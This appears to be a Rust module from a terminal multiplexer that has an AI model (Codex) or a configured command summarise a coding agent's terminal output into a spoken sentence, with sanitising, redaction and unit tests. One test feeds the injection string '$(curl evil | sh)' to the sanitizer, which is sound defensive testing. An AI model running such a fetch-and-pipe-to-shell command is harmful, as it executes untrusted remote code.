use crate::config::Config;
use crate::deadline::{
    DeadlineTimeout, LineMessage, TwoPhaseDeadline, drain_stderr, pump_stdout_lines,
    stop_subprocess,
};
use crate::redact::{redact_command, redact_command_text};
use serde_json::Value;
use std::io::{Read, Write};
use std::process::{Command, ExitStatus, Stdio};
use std::sync::mpsc::{self, Receiver, RecvTimeoutError};
use std::thread;
use std::time::{Duration, Instant};

pub const ANNOUNCEMENT_PROMPT: &str = concat!(
    "You are the voice announcer for a terminal multiplexer. ",
    "An AI coding agent named '{agent}' in workspace '{workspace}' just ",
    "changed state to '{status}'. Below is the tail of its terminal output. ",
    "Write ONE natural spoken sentence (maximum 25 words) summarizing what ",
    "happened, suitable for text-to-speech. Plain words only: no markdown, no ",
    "code symbols, no file paths. Lead with the agent name. Reply with the ",
    "sentence and nothing else."
);

pub const SUMMARY_PROMPT: &str = concat!(
    "An AI coding agent named '{agent}' in workspace '{workspace}' just ",
    "changed state to '{status}'. Below is the tail of its terminal output. ",
    "Write ONE factual sentence (maximum 25 words) stating what the agent did ",
    "and the outcome, suitable for text-to-speech. Plain words only: no ",
    "markdown, no code symbols, no file paths. Reply with the sentence and ",
    "nothing else."
);

const CODEX_MODEL_ACTIVITY_ITEMS: [&str; 5] = [
    "agent_message",
    "reasoning",
    "command_execution",
    "mcp_tool_call",
    "web_search",
];

fn python_string(value: &Value) -> String {
    match value {
        Value::Null => "None".to_owned(),
        Value::Bool(true) => "True".to_owned(),
        Value::Bool(false) => "False".to_owned(),
        Value::String(value) => value.clone(),
        Value::Number(value) => value.to_string(),
        other => other.to_string(),
    }
}

fn positive_finite_timeout(config: &Config, key: &str) -> Result<f64, String> {
    let value = config.get(key);
    let timeout = value
        .as_f64()
        .or_else(|| value.as_str()?.parse().ok())
        .ok_or_else(|| "timeout must be finite and greater than zero".to_owned())?;
    if !timeout.is_finite() || timeout <= 0.0 {
        return Err("timeout must be finite and greater than zero".to_owned());
    }
    Ok(timeout)
}

fn duration(seconds: f64) -> Duration {
    Duration::from_secs_f64(seconds)
}

pub fn template_summary(name: &str, workspace: &str, status: &str) -> String {
    let location = if workspace.is_empty() {
        String::new()
    } else {
        format!(" in {workspace}")
    };
    match status {
        "done" => format!("{name} finished{location}."),
        "blocked" => format!("{name} needs your input{location}."),
        _ => format!("{name} is now {status}{location}."),
    }
}

pub fn sanitize_summary(summary: &str) -> String {
    let cleaned: String = summary
        .chars()
        .map(|character| {
            if character.is_alphabetic() || character.is_numeric() || " ,.!?-".contains(character) {
                character
            } else {
                ' '
            }
        })
        .collect();
    cleaned
        .split_whitespace()
        .take(40)
        .collect::<Vec<_>>()
        .join(" ")
}

pub fn build_prompt(config: &Config, name: &str, workspace: &str, status: &str) -> String {
    let style = config
        .string("style")
        .unwrap_or("announcement")
        .to_lowercase();
    let custom = config.string("custom_prompt").unwrap_or("");
    let template = if style == "custom" && !custom.is_empty() {
        custom
    } else if style == "summary" {
        SUMMARY_PROMPT
    } else {
        ANNOUNCEMENT_PROMPT
    };
    template
        .replace("{agent}", name)
        .replace("{workspace}", workspace)
        .replace("{status}", status)
}

fn last_nonempty_line(text: &str) -> String {
    text.lines()
        .rev()
        .find(|line| !line.trim().is_empty())
        .map(|line| line.trim().chars().take(120).collect())
        .unwrap_or_default()
}

fn append_codex_reason(reasons: &mut Vec<String>, cause: &str, stderr: &str) {
    let mut reason = format!("codex: {cause}");
    let detail = last_nonempty_line(stderr);
    if !detail.is_empty() {
        reason.push(' ');
        reason.push_str(&detail);
    }
    reasons.push(reason);
}

#[derive(Debug, PartialEq, Eq)]
enum CollectResult {
    Summary(Option<String>),
    Failed(&'static str),
}

fn collect_codex_summary(
    messages: &Receiver<LineMessage>,
    first_activity_deadline: Instant,
    completion_timeout: Duration,
) -> Result<CollectResult, DeadlineTimeout> {
    let mut deadline = TwoPhaseDeadline::new(
        Some(first_activity_deadline),
        Some(completion_timeout),
        None,
        "Codex produced no model activity",
        "Codex summary timed out",
    );
    let mut last_message = None;

    loop {
        let remaining = deadline.remaining()?;
        let message = match messages.recv_timeout(remaining) {
            Ok(message) => message,
            Err(RecvTimeoutError::Timeout) => return Err(deadline.timeout()),
            Err(RecvTimeoutError::Disconnected) => LineMessage::Eof,
        };
        let LineMessage::Line(line) = message else {
            return Ok(CollectResult::Summary(last_message));
        };
        let Ok(event) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        let Some(event) = event.as_object() else {
            continue;
        };
        let event_type = event.get("type").and_then(Value::as_str);
        let item = event.get("item").and_then(Value::as_object);
        let item_type = item
            .and_then(|item| item.get("type"))
            .and_then(Value::as_str);
        if matches!(event_type, Some("item.started" | "item.completed"))
            && item_type.is_some_and(|kind| CODEX_MODEL_ACTIVITY_ITEMS.contains(&kind))
        {
            deadline.record_activity();
        }
        if event_type == Some("item.completed")
            && item_type == Some("agent_message")
            && let Some(text) = item
                .and_then(|item| item.get("text"))
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|text| !text.is_empty())
        {
            last_message = Some(text.to_owned());
        }
        match event_type {
            Some("turn.completed") => return Ok(CollectResult::Summary(last_message)),
            Some("turn.failed") => return Ok(CollectResult::Failed("turn.failed")),
            Some("error") => return Ok(CollectResult::Failed("error")),
            _ => {}
        }
    }
}

pub fn codex_summary(
    config: &Config,
    name: &str,
    workspace: &str,
    status: &str,
    transcript: &str,
    reasons: &mut Vec<String>,
) -> Option<String> {
    // Validate both values before spawning so invalid budgets cannot launch Codex.
    let first_timeout =
        match positive_finite_timeout(config, "summary_first_activity_timeout_seconds") {
            Ok(value) => value,
            Err(detail) => {
                append_codex_reason(reasons, &detail.chars().take(120).collect::<String>(), "");
                return None;
            }
        };
    let completion_timeout = match positive_finite_timeout(config, "codex_timeout_seconds") {
        Ok(value) => value,
        Err(detail) => {
            append_codex_reason(reasons, &detail.chars().take(120).collect::<String>(), "");
            return None;
        }
    };
    let prompt = format!(
        "{} --- terminal output --- {transcript}",
        build_prompt(config, name, workspace, status)
    );
    let command = vec![
        "codex".to_owned(),
        "exec".to_owned(),
        "--json".to_owned(),
        "-m".to_owned(),
        python_string(config.get("codex_model")),
        "-c".to_owned(),
        format!(
            "model_reasoning_effort={}",
            python_string(config.get("codex_effort"))
        ),
        "--sandbox".to_owned(),
        "read-only".to_owned(),
        "--ephemeral".to_owned(),
        "--ignore-user-config".to_owned(),
        "--ignore-rules".to_owned(),
        "--skip-git-repo-check".to_owned(),
        prompt,
    ];
    let first_deadline = Instant::now() + duration(first_timeout);
    let mut process = match Command::new(&command[0])
        .args(&command[1..])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(process) => process,
        Err(error) => {
            let detail = error.to_string();
            append_codex_reason(reasons, &detail.chars().take(120).collect::<String>(), "");
            return None;
        }
    };
    let Some(stdout) = process.stdout.take() else {
        stop_subprocess(&mut process);
        append_codex_reason(reasons, "missing-stream", "");
        return None;
    };
    let Some(stderr) = process.stderr.take() else {
        stop_subprocess(&mut process);
        append_codex_reason(reasons, "missing-stream", "");
        return None;
    };
    let (sender, receiver) = mpsc::channel();
    let stdout_thread = pump_stdout_lines(stdout, sender);
    let stderr_thread = drain_stderr(stderr, 4000);
    let collected = collect_codex_summary(&receiver, first_deadline, duration(completion_timeout));
    stop_subprocess(&mut process);
    let _ = stdout_thread.join();
    let stderr = stderr_thread.join().unwrap_or_default();

    let output = match collected {
        Err(error) if error.0 == "Codex produced no model activity" => {
            append_codex_reason(reasons, "timeout-first-activity", &stderr);
            return None;
        }
        Err(_) => {
            append_codex_reason(reasons, "timeout-completion", &stderr);
            return None;
        }
        Ok(CollectResult::Failed(cause)) => {
            append_codex_reason(reasons, cause, &stderr);
            return None;
        }
        Ok(CollectResult::Summary(None)) => {
            append_codex_reason(reasons, "no-summary", &stderr);
            return None;
        }
        Ok(CollectResult::Summary(Some(output))) => output,
    };
    let sanitized = sanitize_summary(&output);
    if sanitized.is_empty() {
        append_codex_reason(reasons, "empty-after-sanitize", &stderr);
        None
    } else {
        Some(sanitized)
    }
}

#[derive(Debug)]
struct CommandOutput {
    status: ExitStatus,
    stdout: String,
    stderr: String,
}

fn read_all(mut stream: impl Read + Send + 'static) -> thread::JoinHandle<Vec<u8>> {
    thread::spawn(move || {
        let mut bytes = Vec::new();
        let _ = stream.read_to_end(&mut bytes);
        bytes
    })
}

fn run_summary_command(
    command: &[String],
    transcript: &str,
    first_raw: &str,
    completion_raw: &str,
    timeout: Duration,
) -> Result<CommandOutput, String> {
    let mut process = Command::new(&command[0]);
    process
        .args(&command[1..])
        .env("HERDR_SUMMARY_FIRST_ACTIVITY_TIMEOUT_SECONDS", first_raw)
        .env("HERDR_SUMMARY_OVERALL_TIMEOUT_SECONDS", completion_raw)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = process.spawn().map_err(|error| error.to_string())?;
    let stdout = read_all(child.stdout.take().expect("piped stdout"));
    let stderr = read_all(child.stderr.take().expect("piped stderr"));
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(transcript.as_bytes());
    }
    let started = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) if started.elapsed() < timeout => thread::sleep(Duration::from_millis(10)),
            Ok(None) => {
                stop_subprocess(&mut child);
                let _ = stdout.join();
                let _ = stderr.join();
                return Err("__timeout__".to_owned());
            }
            Err(error) => {
                stop_subprocess(&mut child);
                let _ = stdout.join();
                let _ = stderr.join();
                return Err(error.to_string());
            }
        }
    };
    let stdout = String::from_utf8_lossy(&stdout.join().unwrap_or_default()).into_owned();
    let stderr = String::from_utf8_lossy(&stderr.join().unwrap_or_default()).into_owned();
    Ok(CommandOutput {
        status,
        stdout,
        stderr,
    })
}

pub fn command_summary(
    config: &Config,
    name: &str,
    workspace: &str,
    status: &str,
    transcript: &str,
    reasons: &mut Vec<String>,
) -> Option<String> {
    let Some(command_value) = config.get("summary_command").as_array() else {
        reasons.push("command: invalid-command".to_owned());
        return None;
    };
    if command_value.is_empty() || command_value.iter().any(|value| !value.is_string()) {
        reasons.push("command: invalid-command".to_owned());
        return None;
    }
    let command: Vec<String> = command_value
        .iter()
        .map(|value| {
            value
                .as_str()
                .unwrap()
                .replace("{agent}", name)
                .replace("{workspace}", workspace)
                .replace("{status}", status)
        })
        .collect();

    let first = match positive_finite_timeout(config, "summary_first_activity_timeout_seconds") {
        Ok(value) => value,
        Err(detail) => {
            reasons.push(format!(
                "command: {}",
                redact_command_text(&detail, &command)
                    .trim()
                    .chars()
                    .take(120)
                    .collect::<String>()
            ));
            return None;
        }
    };
    let completion = match positive_finite_timeout(config, "summary_command_timeout_seconds") {
        Ok(value) => value,
        Err(detail) => {
            reasons.push(format!(
                "command: {}",
                redact_command_text(&detail, &command)
                    .trim()
                    .chars()
                    .take(120)
                    .collect::<String>()
            ));
            return None;
        }
    };
    let first_raw = python_string(config.get("summary_first_activity_timeout_seconds"));
    let completion_raw = python_string(config.get("summary_command_timeout_seconds"));
    let completed = match run_summary_command(
        &command,
        transcript,
        &first_raw,
        &completion_raw,
        duration(first + completion + 2.0),
    ) {
        Ok(completed) => completed,
        Err(detail) if detail == "__timeout__" => {
            reasons.push("command: timeout".to_owned());
            return None;
        }
        Err(detail) => {
            let safe = redact_command_text(&detail, &command);
            reasons.push(format!(
                "command: {}",
                if safe.trim().is_empty() {
                    "command failed".to_owned()
                } else {
                    safe.trim().chars().take(120).collect()
                }
            ));
            return None;
        }
    };
    if !completed.status.success() {
        let detail = format!(
            "command {:?} exited with {}{}",
            redact_command(&command),
            completed.status,
            if completed.stderr.trim().is_empty() {
                String::new()
            } else {
                format!(": {}", completed.stderr.trim())
            }
        );
        let safe = redact_command_text(&detail, &command);
        reasons.push(format!(
            "command: {}",
            safe.trim().chars().take(120).collect::<String>()
        ));
        return None;
    }
    let Some(output) = completed
        .stdout
        .lines()
        .rev()
        .find(|line| !line.trim().is_empty())
        .map(str::trim)
    else {
        let detail = last_nonempty_line(&completed.stderr);
        let detail = redact_command_text(&detail, &command);
        reasons.push(format!(
            "command: no-output{}",
            if detail.is_empty() {
                String::new()
            } else {
                format!(" {}", detail.chars().take(120).collect::<String>())
            }
        ));
        return None;
    };
    let sanitized = sanitize_summary(output);
    if sanitized.is_empty() {
        reasons.push("command: empty-after-sanitize".to_owned());
        None
    } else {
        Some(sanitized)
    }
}

pub fn make_announcement(
    config: &Config,
    name: &str,
    workspace: &str,
    status: &str,
    transcript: &str,
    reasons: &mut Vec<String>,
) -> (String, &'static str) {
    let mode = config.string("summary").unwrap_or("").to_lowercase();
    if mode == "template" {
        return (template_summary(name, workspace, status), "template");
    }

    if !transcript.is_empty() {
        let generated = match mode.as_str() {
            "codex" => codex_summary(config, name, workspace, status, transcript, reasons),
            "command" => command_summary(config, name, workspace, status, transcript, reasons),
            _ => None,
        };
        if let Some(generated) = generated {
            return (
                generated,
                if mode == "command" {
                    "command"
                } else {
                    "codex"
                },
            );
        }
    }

    let fallback = config
        .string("summary_fallback")
        .unwrap_or("template")
        .to_lowercase();
    if !transcript.is_empty()
        && fallback == "codex"
        && mode != "codex"
        && let Some(generated) = codex_summary(config, name, workspace, status, transcript, reasons)
    {
        return (generated, "codex-fallback");
    }
    (template_summary(name, workspace, status), "template")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::load_config;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;

    fn config(contents: &str) -> Config {
        let temp = tempfile::tempdir().unwrap();
        fs::write(temp.path().join("config.toml"), contents).unwrap();
        load_config(temp.path(), &mut Vec::new(), None).unwrap()
    }

    #[test]
    fn prompts_and_replacement_order_are_exact() {
        let config =
            config("style = \"custom\"\ncustom_prompt = \"{agent} {workspace} {status}\"\n");
        assert_eq!(
            build_prompt(&config, "{workspace}", "yard", "done"),
            "yard yard done"
        );
        assert!(ANNOUNCEMENT_PROMPT.starts_with("You are the voice announcer"));
        assert!(SUMMARY_PROMPT.starts_with("An AI coding agent"));
    }

    #[test]
    fn sanitizer_is_unicode_aware_and_caps_words() {
        assert_eq!(sanitize_summary("$(curl evil | sh)"), "curl evil sh");
        assert_eq!(
            sanitize_summary("Élodie 完成 １２, déjà-vu!"),
            "Élodie 完成 １２, déjà-vu!"
        );
        let words = (0..50)
            .map(|i| format!("word{i}"))
            .collect::<Vec<_>>()
            .join(" ");
        assert_eq!(sanitize_summary(&words).split_whitespace().count(), 40);
    }

    #[test]
    fn template_and_empty_transcript_fallback_rules_match_python() {
        let template = config("summary = \"template\"\nsummary_fallback = \"codex\"\n");
        let mut reasons = Vec::new();
        assert_eq!(
            make_announcement(&template, "builder", "work", "done", "x", &mut reasons),
            ("builder finished in work.".to_owned(), "template")
        );
        let codex = config("summary = \"codex\"\n");
        assert_eq!(
            make_announcement(&codex, "builder", "", "done", "", &mut reasons).1,
            "template"
        );
        assert!(reasons.is_empty());
    }

    #[test]
    fn collector_eof_returns_last_completed_agent_message() {
        let (sender, receiver) = mpsc::channel();
        sender
            .send(LineMessage::Line(
                r#"{"type":"item.started","item":{"type":"reasoning"}}"#.to_owned(),
            ))
            .unwrap();
        sender
            .send(LineMessage::Line(
                r#"{"type":"item.completed","item":{"type":"agent_message","text":"first"}}"#
                    .to_owned(),
            ))
            .unwrap();
        sender
            .send(LineMessage::Line(
                r#"{"type":"item.completed","item":{"type":"agent_message","text":"last"}}"#
                    .to_owned(),
            ))
            .unwrap();
        sender.send(LineMessage::Eof).unwrap();
        assert_eq!(
            collect_codex_summary(
                &receiver,
                Instant::now() + Duration::from_secs(1),
                Duration::from_secs(1)
            )
            .unwrap(),
            CollectResult::Summary(Some("last".to_owned()))
        );
    }

    #[test]
    fn collector_failed_and_error_are_distinct() {
        for (event, cause) in [("turn.failed", "turn.failed"), ("error", "error")] {
            let (sender, receiver) = mpsc::channel();
            sender
                .send(LineMessage::Line(format!(r#"{{"type":"{event}"}}"#)))
                .unwrap();
            assert_eq!(
                collect_codex_summary(
                    &receiver,
                    Instant::now() + Duration::from_secs(1),
                    Duration::from_secs(1)
                )
                .unwrap(),
                CollectResult::Failed(cause)
            );
        }
    }

    #[test]
    fn command_substitutes_all_args_and_exports_raw_timeouts() {
        let temp = tempfile::tempdir().unwrap();
        let script = temp.path().join("summary");
        fs::write(&script, "#!/bin/sh\nprintf '%s %s %s\\n' \"$1\" \"$2\" \"$HERDR_SUMMARY_FIRST_ACTIVITY_TIMEOUT_SECONDS/$HERDR_SUMMARY_OVERALL_TIMEOUT_SECONDS\"\n").unwrap();
        fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
        let config = config(&format!(
            "summary_command = [\"{}\", \"{{agent}}\", \"{{workspace}}-{{status}}\"]\nsummary_first_activity_timeout_seconds = 5.0\nsummary_command_timeout_seconds = 20.0\n",
            script.display()
        ));
        let mut reasons = Vec::new();
        assert_eq!(
            command_summary(&config, "builder", "work", "done", "tail", &mut reasons),
            Some("builder work-done 5.0 20.0".to_owned())
        );
    }

    #[test]
    fn command_failure_and_no_output_redact_secrets() {
        let secret = "sk-super-secret-1234";
        let failed = config(&format!(
            "summary_command = [\"/bin/sh\", \"-c\", \"echo '$3' >&2; exit 2\", \"_\", \"--api-key\", \"{secret}\"]\n"
        ));
        let mut reasons = Vec::new();
        assert!(command_summary(&failed, "a", "w", "done", "tail", &mut reasons).is_none());
        assert!(!reasons[0].contains(secret));
        assert!(reasons[0].contains("****1234"));

        let empty = config(&format!(
            "summary_command = [\"/bin/sh\", \"-c\", \"echo $1 >&2\", \"_\", \"{secret}\"]\n"
        ));
        reasons.clear();
        assert!(command_summary(&empty, "a", "w", "done", "tail", &mut reasons).is_none());
        assert_eq!(reasons[0], "command: no-output ****1234");
    }
}
